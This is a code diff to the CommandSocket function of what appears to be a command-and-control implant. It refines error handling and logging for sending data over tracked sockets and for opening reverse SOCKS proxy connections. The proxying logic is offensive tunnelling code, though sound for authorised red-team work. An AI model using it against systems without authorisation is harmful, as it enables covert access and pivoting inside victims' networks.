@@ -2743,35 +2743,40 @@ VOID CommandSocket( PPARSER Parser )
             SocketID    = ParserGetInt32( Parser );
             Data.Buffer = ParserGetBytes( Parser, &Data.Length );
 
-            PRINTF( "Socket ID: %x\n", SocketID )
-            PRINTF( "Data[%d]: %p\n", Data.Length, Data.Buffer )
-
             /* get Sockets list */
             Socket = Instance.Sockets;
 
             for ( ;; )
             {
                 if ( ! Socket )
+                {
+                    PRINTF( "Could not find socket: %x\n", SocketID )
                     break;
+                }
 
                 if ( Socket->ID == SocketID )
                 {
-                    PRINTF( "Found socket: %x\n", Socket->ID )
-
                     /* write the data to the socket */
-                    if ( Instance.Win32.send( Socket->Socket, Data.Buffer, Data.Length, 0 ) == SOCKET_ERROR )
-                        PUTS( "send failed" );
+                    if ( Instance.Win32.send( Socket->Socket, Data.Buffer, Data.Length, 0 ) != SOCKET_ERROR )
+                    {
+                        PRINTF( "Sent 0x%x bytes to Socket %x\n", Data.Length, SocketID )
+                    }
+                    else
+                    {
+                        PRINTF( "Sending 0x%x bytes to Socket %x failed with %d\n", Data.Length, SocketID, Instance.Win32.WSAGetLastError() );
+                    }
 
-                    /* destroy the package and exit this command function */
-                    PackageDestroy( Package );
-
-                    return;
+                    break;
                 }
 
                 Socket = Socket->Next;
             }
 
-            break;
+            /* destroy the package and exit this command function */
+            PackageDestroy( Package );
+            Package = NULL;
+
+            return;
         }
 
         case SOCKET_COMMAND_CONNECT: PUTS( "Socket::Connect" )
@@ -2784,6 +2789,7 @@ VOID CommandSocket( PPARSER Parser )
             PBYTE  IPv6       = NULL;
             INT16  Port       = 0;
             LPSTR  Domain     = NULL;
+            UINT32 ErrorCode  = 0;
 
             /* parse arguments */
             ScId   = ParserGetInt32( Parser );
@@ -2814,10 +2820,6 @@ VOID CommandSocket( PPARSER Parser )
                 if ( ! IPv4 )
                 {
                     IPv6 = DnsQueryIPv6( (LPSTR)Domain );
-                    if ( ! IPv6 )
-                    {
-                        PRINTF( "Could not resolve domain: %s\n", Domain );
-                    }
                 }
 
                 Instance.Win32.LocalFree( Domain );
@@ -2836,14 +2838,28 @@ VOID CommandSocket( PPARSER Parser )
             {
                 /* Create a socks proxy socket and insert it into the linked list. */
                 if ( ( Socket = SocketNew( 0, SOCKET_TYPE_REVERSE_PROXY, IPv4, IPv6, Port, 0, 0 ) ) )
+                {
                     Socket->ID = ScId;
+                    ErrorCode = 0;
+                }
+                else
+                {
+                    ErrorCode = NtGetLastError();
+                    PRINTF( "Connect failed with %d\n", ErrorCode )
+                }
 
                 PackageAddInt32( Package, Socket ? TRUE : FALSE );
             }
-            else PackageAddInt32( Package, FALSE );
+            else
+            {
+                PRINTF( "Could not resolve domain: %s\n", Domain );
+                // error code for "Host unreachable"
+                ErrorCode = 10065;
+                PackageAddInt32( Package, FALSE );
+            }
 
             PackageAddInt32( Package, ScId );
-            PackageAddInt32( Package, NtGetLastError() );
+            PackageAddInt32( Package, ErrorCode );
 
             if ( IPv6 )
             {
